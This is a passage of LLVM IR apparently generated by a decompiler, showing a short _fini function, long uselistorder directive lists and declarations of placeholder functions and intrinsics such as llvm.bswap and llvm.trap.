  uselistorder i32 2, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 180, 37, 38, 39, 160, 40, 41, 42, 43, 44, 196, 197, 198, 200, 201, 202, 93, 203, 45, 125, 204, 205, 206, 46, 126, 207, 208, 209, 122, 127, 212, 0, 215, 161, 162, 94, 128, 216, 129, 175, 47, 176, 217, 218, 219, 48, 181, 182, 183, 163, 199, 220, 221, 222, 223, 49, 50, 95, 96, 97, 238, 239, 113, 240, 241, 98, 242, 243, 213, 184, 92, 185, 186, 51, 52, 187, 188, 130, 131, 244, 53, 174, 54, 99, 55, 56, 111, 177, 90, 57, 245, 112, 229, 58, 59, 230, 60, 61, 91, 210, 62, 63, 64, 211, 65, 66, 67, 68, 114, 231, 232, 69, 70, 1, 164, 233, 71, 234, 224, 165, 2, 72, 73, 74, 100, 101, 102, 116, 103, 117, 104, 105, 132, 106, 108, 107, 109, 166, 167, 168, 189, 190, 123, 75, 76, 77, 78, 79, 124, 191, 118, 115, 80, 192, 193, 194, 214, 169, 81, 82, 83, 170, 84, 85, 86, 87, 88, 133, 178, 134, 135, 136, 137, 119, 179, 138, 139, 120, 140, 141, 142, 143, 144, 145, 147, 171, 146, 172, 150, 148, 149, 173, 159, 151, 195, 152, 153, 154, 225, 226, 227, 155, 228, 110, 156, 157, 158, 237, 121, 235, 89, 236 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  %v3_1ac3c = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_1ac3c)
  %v31_1ac44 = load i32, i32* @r0, align 4
  ret i32 %v31_1ac44

; uselistorder directives
  uselistorder i32* @r0, { 30, 211, 205, 206, 207, 208, 209, 210, 31, 28, 212, 90, 213, 5, 91, 214, 215, 89, 92, 216, 32, 29, 217, 218, 219, 220, 129, 33, 130, 131, 34, 35, 221, 222, 223, 224, 225, 226, 24, 227, 228, 36, 6, 275, 277, 111, 276, 2, 288, 287, 44, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 301, 302, 303, 315, 316, 317, 318, 319, 320, 321, 322, 114, 323, 132, 324, 325, 326, 328, 327, 14, 307, 229, 230, 133, 134, 37, 38, 39, 329, 330, 331, 332, 333, 40, 15, 42, 365, 16, 43, 17, 18, 279, 3, 280, 202, 203, 204, 7, 310, 46, 231, 232, 86, 87, 233, 234, 235, 88, 236, 237, 238, 47, 239, 240, 241, 242, 48, 66, 278, 281, 282, 283, 284, 285, 286, 49, 50, 135, 136, 137, 51, 52, 53, 54, 351, 345, 55, 366, 352, 368, 369, 119, 120, 121, 122, 123, 124, 125, 126, 56, 57, 58, 127, 128, 367, 300, 68, 271, 272, 273, 274, 138, 139, 354, 59, 117, 118, 355, 8, 356, 357, 358, 304, 112, 305, 306, 113, 70, 359, 360, 361, 362, 363, 346, 145, 60, 334, 41, 342, 67, 243, 244, 245, 61, 19, 62, 45, 309, 63, 246, 247, 248, 9, 10, 249, 250, 11, 13, 0, 1, 251, 252, 12, 253, 254, 255, 65, 109, 256, 257, 258, 259, 260, 64, 261, 20, 262, 263, 4, 264, 308, 140, 141, 142, 143, 144, 311, 312, 313, 314, 265, 266, 146, 340, 69, 147, 353, 148, 93, 149, 150, 151, 94, 152, 95, 96, 97, 98, 153, 154, 155, 156, 99, 100, 157, 158, 159, 160, 161, 101, 102, 103, 27, 23, 104, 162, 163, 164, 165, 166, 26, 22, 105, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 25, 21, 106, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 107, 200, 201, 108, 110, 267, 268, 269, 270, 335, 336, 337, 338, 339, 341, 343, 344, 347, 348, 349, 350, 115, 116, 364, 71, 72, 73, 74, 75, 83, 84, 85, 76, 77, 78, 79, 80, 81, 82 }
  uselistorder void (i32)* @__pseudo_branch, { 15, 81, 82, 83, 33, 34, 44, 45, 46, 95, 41, 42, 43, 35, 16, 17, 18, 19, 20, 21, 100, 101, 102, 103, 104, 96, 87, 97, 98, 99, 0, 38, 39, 40, 22, 23, 24, 25, 26, 27, 84, 85, 86, 105, 106, 107, 88, 89, 90, 55, 56, 57, 91, 92, 93, 108, 64, 65, 66, 67, 68, 69, 70, 71, 72, 58, 59, 60, 61, 62, 63, 29, 30, 73, 74, 31, 32, 36, 37, 28, 75, 76, 77, 78, 79, 80, 47, 48, 49, 50, 51, 52, 53, 54, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 94 }
  uselistorder i32 0, { 0, 1067, 1, 1068, 1069, 852, 443, 444, 1070, 1071, 1072, 1073, 1074, 1075, 1076, 3, 4, 5, 1077, 1078, 2, 1079, 1080, 853, 6, 1081, 1082, 35, 854, 1083, 1084, 1085, 1086, 1087, 1088, 1089, 1090, 107, 106, 226, 227, 228, 1091, 1092, 1093, 7, 1094, 1095, 36, 1096, 1097, 1098, 37, 38, 219, 1099, 1100, 1101, 1102, 39, 220, 455, 1103, 1104, 1105, 1106, 1107, 1108, 40, 1109, 9, 8, 41, 855, 1110, 857, 856, 1111, 1112, 1113, 1114, 1115, 10, 914, 915, 916, 917, 918, 919, 920, 921, 922, 923, 858, 924, 1116, 1117, 1118, 1119, 1120, 11, 1121, 859, 1122, 1123, 1124, 1125, 221, 222, 456, 1126, 1127, 13, 12, 1128, 1129, 1130, 1131, 1132, 1133, 1134, 860, 861, 1135, 863, 1136, 1137, 864, 865, 1138, 1139, 862, 1140, 866, 1141, 867, 1142, 1143, 1144, 1145, 14, 1333, 1334, 1335, 1336, 135, 1337, 229, 1338, 1339, 1340, 1341, 1342, 1343, 1344, 230, 868, 871, 869, 870, 1345, 1346, 1347, 1348, 1349, 1350, 1357, 1358, 55, 56, 1367, 1368, 1359, 1360, 1361, 1362, 1363, 1364, 1365, 1366, 1369, 1370, 1377, 1372, 1373, 1375, 1374, 1376, 113, 231, 1400, 1407, 232, 1408, 126, 1409, 127, 1410, 128, 1411, 129, 1412, 233, 1413, 1414, 1146, 1147, 1418, 1419, 234, 1420, 1421, 1422, 235, 1423, 1424, 87, 90, 91, 114, 1425, 88, 1426, 89, 1427, 1428, 1429, 146, 147, 1430, 1431, 1432, 236, 1433, 1434, 393, 1435, 1436, 457, 1437, 1438, 1439, 1440, 1441, 1442, 1443, 92, 1444, 1445, 115, 1460, 1461, 1462, 1463, 1464, 1465, 339, 1466, 1467, 1468, 1478, 1469, 1513, 1533, 1534, 1535, 1477, 237, 148, 1536, 399, 389, 390, 458, 1537, 1538, 1539, 1541, 1542, 1543, 1544, 42, 1545, 1546, 57, 1547, 1548, 1549, 1550, 1553, 1554, 1555, 1556, 1557, 1558, 238, 1559, 1560, 872, 1561, 1551, 1540, 873, 336, 874, 1552, 1562, 1563, 1564, 1565, 58, 1567, 59, 1566, 149, 1568, 1569, 239, 925, 926, 927, 928, 929, 116, 930, 931, 240, 43, 241, 932, 459, 933, 391, 242, 243, 460, 461, 245, 1570, 1571, 1572, 1573, 1574, 246, 244, 462, 463, 1575, 1576, 1577, 1578, 247, 464, 1579, 465, 1580, 60, 61, 62, 63, 445, 248, 1581, 130, 1582, 250, 249, 466, 467, 136, 1479, 1480, 1481, 1482, 1483, 1148, 1149, 1150, 1151, 1152, 1153, 251, 108, 392, 1154, 1155, 1156, 93, 1484, 468, 1485, 1486, 1487, 150, 1157, 469, 1158, 1159, 1160, 1161, 1162, 1163, 400, 401, 936, 937, 1415, 1416, 402, 1417, 470, 934, 471, 935, 943, 944, 15, 151, 152, 261, 260, 259, 258, 255, 253, 254, 257, 256, 252, 1401, 1402, 1403, 1404, 472, 1583, 1584, 1585, 262, 1586, 1590, 1591, 1592, 1593, 1594, 263, 1595, 153, 1637, 1638, 1639, 1640, 264, 265, 1641, 1378, 1379, 1380, 340, 1738, 94, 341, 1742, 1743, 122, 64, 154, 875, 1164, 65, 155, 1165, 1166, 342, 1038, 1039, 343, 66, 1381, 117, 266, 1040, 1041, 156, 876, 345, 1167, 67, 123, 1168, 1169, 344, 1744, 1745, 1746, 1747, 1748, 1751, 1752, 1753, 1754, 1755, 1756, 1757, 1758, 1759, 1760, 1749, 1750, 1761, 1762, 1763, 1764, 1765, 1766, 1767, 1768, 44, 1769, 1770, 1771, 1772, 1773, 45, 1774, 1775, 1776, 46, 1777, 1778, 1779, 47, 1780, 1781, 1782, 1783, 1784, 1785, 1786, 1787, 1788, 1789, 1790, 1791, 1792, 1793, 1794, 1795, 1796, 1797, 1798, 1799, 1800, 1801, 1802, 1803, 1806, 1807, 1808, 1809, 1810, 1811, 1812, 1804, 1805, 1813, 1814, 1815, 1816, 1817, 1818, 1819, 1820, 1821, 1822, 48, 1823, 1824, 1825, 1826, 1827, 49, 1828, 1829, 1830, 1831, 1832, 50, 1833, 1834, 1835, 1836, 1837, 1838, 1839, 1840, 1841, 1842, 1843, 1844, 1845, 1846, 1847, 1488, 1489, 1505, 473, 474, 1506, 1507, 157, 1382, 1170, 1171, 1172, 1173, 1174, 268, 1175, 1176, 1177, 1178, 1179, 1180, 1181, 1182, 1183, 1184, 1185, 1186, 159, 158, 269, 270, 1187, 1188, 1189, 1190, 1191, 1192, 160, 161, 1193, 1194, 1195, 1196, 1197, 1198, 51, 1199, 1200, 1201, 1202, 1203, 68, 271, 1204, 162, 476, 1205, 1206, 1207, 1208, 1209, 477, 272, 1210, 1211, 1212, 1213, 408, 1214, 1215, 1216, 407, 1217, 1218, 406, 1219, 1220, 267, 1221, 475, 1222, 274, 1223, 52, 1224, 403, 394, 1225, 1226, 1227, 478, 479, 1228, 1229, 1230, 404, 405, 1231, 1232, 1233, 273, 1234, 1235, 1236, 1237, 1238, 1239, 1623, 16, 1624, 1625, 1626, 877, 1627, 1628, 1629, 1630, 1631, 1632, 1241, 1240, 1242, 1243, 1244, 1245, 1246, 1247, 1248, 1249, 1250, 1251, 1252, 1253, 1254, 1255, 163, 1490, 1491, 1492, 17, 1493, 346, 1257, 1256, 347, 1258, 1259, 164, 1260, 275, 277, 1405, 276, 1406, 278, 1371, 165, 1383, 1388, 1389, 1384, 1385, 1386, 1391, 1392, 1393, 279, 1394, 1395, 1396, 1397, 1398, 1387, 1390, 1399, 166, 938, 939, 940, 280, 941, 942, 281, 945, 949, 950, 951, 952, 282, 946, 283, 947, 948, 167, 953, 1848, 1470, 1056, 1666, 1667, 1668, 1669, 284, 1670, 1653, 954, 1654, 1650, 168, 285, 1849, 1850, 1655, 1671, 1672, 169, 879, 480, 1855, 1856, 481, 1857, 1858, 286, 349, 1859, 1860, 482, 95, 1861, 1862, 483, 1870, 1871, 1875, 878, 348, 1876, 484, 1872, 1873, 1874, 1851, 1852, 880, 287, 337, 903, 18, 19, 485, 1656, 288, 904, 906, 905, 289, 907, 908, 909, 486, 910, 141, 969, 131, 970, 291, 290, 971, 170, 292, 1853, 1854, 1450, 1451, 1452, 1453, 1454, 1455, 294, 171, 1456, 1457, 1458, 132, 293, 1459, 487, 955, 172, 956, 173, 957, 295, 1351, 1352, 1353, 20, 1600, 958, 959, 174, 175, 176, 133, 960, 177, 178, 488, 489, 1865, 409, 179, 180, 1678, 1679, 1680, 1681, 1682, 296, 1683, 1684, 1685, 1686, 1687, 1688, 1689, 297, 1673, 490, 1674, 1675, 491, 1676, 1677, 181, 1471, 492, 298, 1472, 1473, 1474, 1475, 1476, 182, 1690, 1691, 302, 300, 301, 1692, 1693, 308, 307, 224, 299, 1694, 1695, 1696, 1697, 1698, 1699, 396, 395, 410, 493, 1700, 1701, 1702, 96, 1703, 304, 303, 305, 306, 223, 1704, 1705, 350, 1706, 1707, 142, 1708, 1709, 1710, 1711, 1712, 21, 22, 972, 973, 97, 183, 23, 411, 494, 1596, 1597, 1057, 1713, 1635, 1612, 1004, 1613, 1642, 1634, 309, 1633, 310, 1514, 311, 69, 24, 1261, 1262, 313, 1263, 1264, 312, 1265, 314, 184, 1739, 1740, 1741, 351, 1587, 1588, 1589, 315, 1266, 1267, 352, 1268, 143, 1601, 1602, 1603, 495, 25, 1877, 1878, 118, 316, 1269, 1270, 1271, 1272, 1273, 317, 1508, 881, 1509, 1510, 185, 186, 187, 1494, 1495, 1503, 1500, 1501, 1502, 353, 388, 1504, 188, 1498, 1496, 1497, 354, 1499, 189, 974, 975, 190, 26, 191, 1511, 1512, 27, 28, 192, 29, 976, 193, 30, 1274, 1275, 1276, 1277, 1278, 194, 1279, 1280, 1281, 1282, 1284, 1285, 1283, 1286, 195, 1287, 1290, 1288, 1289, 318, 496, 1291, 1292, 1293, 319, 320, 1294, 1295, 1296, 1297, 1298, 1299, 497, 1300, 1301, 498, 1302, 1304, 321, 1303, 355, 338, 1305, 1306, 1308, 196, 1309, 323, 1310, 101, 102, 99, 100, 1311, 499, 137, 134, 1312, 1313, 1314, 326, 324, 325, 500, 1315, 1316, 1317, 98, 322, 1318, 1319, 1320, 1321, 1322, 1323, 1324, 1325, 1326, 501, 138, 378, 109, 1327, 1328, 1329, 31, 327, 911, 912, 144, 103, 124, 1307, 356, 197, 962, 961, 358, 964, 963, 357, 965, 966, 502, 967, 198, 1516, 1517, 1518, 104, 105, 1519, 1520, 1521, 328, 1522, 1523, 1524, 1525, 1526, 503, 1527, 1528, 1529, 1530, 1531, 1330, 1532, 199, 1446, 1447, 1448, 1449, 200, 32, 1657, 1866, 1863, 1515, 977, 1714, 968, 1869, 1354, 1864, 1658, 1648, 978, 1636, 1610, 979, 504, 980, 981, 982, 983, 984, 985, 986, 987, 988, 989, 990, 1659, 1867, 139, 1868, 1660, 33, 1715, 1716, 1717, 140, 1718, 1719, 1720, 1721, 1722, 329, 1723, 882, 885, 883, 884, 1724, 886, 397, 511, 512, 359, 513, 991, 510, 53, 54, 514, 992, 993, 515, 525, 526, 555, 556, 70, 412, 505, 225, 507, 508, 413, 509, 994, 360, 201, 517, 518, 516, 995, 996, 997, 998, 1000, 379, 999, 1001, 1002, 521, 522, 519, 520, 1003, 506, 523, 524, 330, 414, 361, 1006, 527, 1005, 531, 532, 528, 529, 530, 1007, 533, 1008, 446, 1009, 534, 1010, 535, 71, 125, 202, 203, 204, 205, 206, 207, 208, 415, 536, 416, 331, 1011, 1012, 542, 332, 1013, 1015, 543, 544, 333, 1014, 364, 1016, 545, 1017, 539, 1018, 1020, 540, 541, 1019, 363, 1021, 538, 546, 1022, 1023, 547, 1024, 1026, 548, 549, 1025, 362, 1027, 537, 550, 1028, 551, 1029, 552, 1030, 553, 1031, 1032, 1033, 554, 1034, 1035, 1036, 1037, 209, 1042, 559, 72, 417, 1043, 1049, 558, 1044, 1045, 1046, 1047, 1048, 365, 1050, 560, 447, 1051, 1052, 557, 1053, 561, 1054, 1055, 210, 211, 212, 563, 382, 73, 380, 381, 1058, 145, 448, 1059, 564, 1060, 562, 1061, 565, 385, 74, 383, 384, 1062, 566, 1063, 1064, 567, 1065, 1066, 334, 568, 1331, 1332, 75, 110, 418, 570, 571, 569, 572, 887, 888, 584, 889, 890, 891, 892, 583, 893, 894, 895, 896, 582, 897, 898, 899, 900, 579, 580, 573, 581, 578, 366, 901, 575, 902, 576, 577, 851, 1355, 76, 120, 1356, 419, 574, 77, 111, 119, 585, 586, 587, 420, 421, 422, 1598, 449, 1599, 121, 367, 335, 78, 79, 588, 423, 424, 425, 426, 595, 1604, 1606, 1607, 1608, 590, 1609, 591, 592, 593, 589, 368, 594, 1605, 450, 597, 598, 596, 427, 34, 600, 599, 601, 1611, 428, 429, 430, 431, 1614, 604, 602, 603, 369, 1615, 605, 1616, 451, 386, 1620, 1621, 432, 1617, 1618, 606, 607, 608, 1619, 610, 611, 612, 613, 614, 609, 370, 615, 1622, 616, 80, 622, 81, 621, 617, 620, 372, 623, 618, 619, 371, 624, 82, 112, 1643, 1644, 452, 1645, 1646, 213, 1647, 83, 453, 1649, 373, 625, 626, 627, 628, 1651, 1652, 398, 629, 1661, 1662, 630, 1663, 631, 1664, 1665, 632, 214, 633, 634, 635, 636, 637, 1735, 215, 84, 387, 374, 435, 436, 1725, 1726, 1727, 375, 433, 434, 437, 1728, 1729, 438, 1730, 1731, 377, 85, 216, 217, 376, 1733, 1734, 454, 218, 86, 638, 1732, 1736, 1737, 439, 440, 913, 441, 442, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 716, 717, 718, 719, 720, 721, 722, 723, 724, 725, 726, 727, 728, 729, 730, 731, 732, 733, 734, 735, 736, 737, 738, 739, 740, 741, 742, 743, 744, 745, 746, 747, 748, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 759, 760, 761, 762, 763, 764, 765, 766, 767, 768, 769, 770, 771, 772, 773, 774, 775, 776, 777, 778, 779, 780, 781, 782, 783, 784, 785, 786, 787, 788, 789, 790, 791, 792, 793, 794, 795, 796, 797, 798, 799, 800, 801, 802, 803, 804, 805, 806, 807, 808, 809, 810, 811, 812, 813, 814, 815, 816, 817, 818, 819, 820, 821, 822, 823, 824, 825, 826, 827, 828, 829, 830, 831, 832, 833, 834, 835, 836, 837, 838, 839, 840, 841, 842, 843, 844, 845, 846, 847, 848, 849, 850, 1879, 1880, 1881, 1882, 1883, 1884, 1885, 1886, 1887, 1888, 1889, 1890, 1891, 1892, 1893 }
  uselistorder i32* @r4, {}
}

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i64 @__decompiler_undefined_function_1() local_unnamed_addr

declare i8* @__decompiler_undefined_function_2() local_unnamed_addr

declare i8 @__decompiler_undefined_function_3() local_unnamed_addr

declare i16 @__decompiler_undefined_function_4() local_unnamed_addr

declare i16* @__decompiler_undefined_function_5() local_unnamed_addr

declare i8** @__decompiler_undefined_function_6() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

; Function Attrs: noreturn nounwind
declare void @llvm.trap() #2

declare float @fabsf(float)

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
attributes #2 = { noreturn nounwind }
